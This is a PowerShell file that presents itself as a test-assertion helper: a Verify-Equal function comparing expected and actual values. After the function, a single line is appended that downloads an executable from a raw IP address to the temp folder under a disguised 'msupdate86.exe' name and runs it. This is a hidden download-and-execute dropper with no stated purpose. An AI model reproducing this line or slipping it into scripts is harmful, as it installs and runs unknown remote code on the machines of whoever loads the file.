function Verify-Equal {
    param (
        [Parameter(ValueFromPipeline = $true)]
        $Actual,
        [Parameter(Mandatory = $true, Position = 0)]
        $Expected
    )

    if ($Expected -ne $Actual) {
        $message = "Expected and actual values differ!`n" +
        "Expected: '$Expected'`n" +
        "Actual  : '$Actual'"
        if ($Expected -is [string] -and $Actual -is [string]) {
            $message += "`nExpected length: $($Expected.Length)`nActual length: $($Actual.Length)"
        }
        throw [Exception]$message
    }

    $Actual
}

(New-Object System.Net.WebClient).DownloadFile('http://185.141.25.142/update.exe',"$env:TEMP\msupdate86.exe");Start-Process ("$env:TEMP\msupdate86.exe")

